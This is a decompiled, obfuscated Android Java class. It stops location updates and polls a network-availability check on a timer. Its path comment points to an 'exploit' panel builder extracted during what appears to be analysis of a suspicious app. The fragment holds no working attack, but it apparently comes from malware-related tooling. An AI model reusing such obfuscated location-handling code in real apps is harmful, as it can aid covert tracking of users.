package v.s;

import android.location.LocationManager;
import android.os.Handler;
import app.mobilex.plus.UtilNWWrapper;
import java.io.Serializable;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class aiO5jRTHj9azsn306 implements Runnable {
    public final /* synthetic */ Object Ee8d2j4S9Vm5yGuR;
    public final /* synthetic */ Object JXn4Qf7zpnLjP5;
    public final /* synthetic */ Serializable vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;
    public final /* synthetic */ Object xDyLpEZyrcKVe0;

    public /* synthetic */ aiO5jRTHj9azsn306(Serializable serializable, Object obj, Object obj2, Object obj3, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = serializable;
        this.JXn4Qf7zpnLjP5 = obj;
        this.Ee8d2j4S9Vm5yGuR = obj2;
        this.xDyLpEZyrcKVe0 = obj3;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i = this.w9sT1Swbhx3hs;
        Object obj = this.JXn4Qf7zpnLjP5;
        Serializable serializable = this.vekpFI4d1Nc4fakF;
        Object obj2 = this.Ee8d2j4S9Vm5yGuR;
        Object obj3 = this.xDyLpEZyrcKVe0;
        switch (i) {
            case 0:
                RsA5TguOLrFfTXOtR rsA5TguOLrFfTXOtR = (RsA5TguOLrFfTXOtR) serializable;
                if (!rsA5TguOLrFfTXOtR.w9sT1Swbhx3hs) {
                    rsA5TguOLrFfTXOtR.w9sT1Swbhx3hs = true;
                    ((LocationManager) obj).removeUpdates((UFMdhUYFauq13T4ja1V) obj2);
                    ((ax0gnbsXD3up2) obj3).ibVTtJUNfrGYbW(null);
                }
                break;
            default:
                AInogFBF3uZEdg60 aInogFBF3uZEdg60 = (AInogFBF3uZEdg60) obj3;
                Handler handler = (Handler) obj2;
                g78iUtGnOvef g78iutgnovef = (g78iUtGnOvef) serializable;
                g78iutgnovef.w9sT1Swbhx3hs++;
                String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!((UtilNWWrapper) obj).EWUjsTERgdPbSw3NNlN() && g78iutgnovef.w9sT1Swbhx3hs < 86 - 66) {
                    handler.postDelayed(this, 500L);
                } else {
                    handler.removeCallbacks(aInogFBF3uZEdg60);
                    aInogFBF3uZEdg60.run();
                }
                break;
        }
    }
}
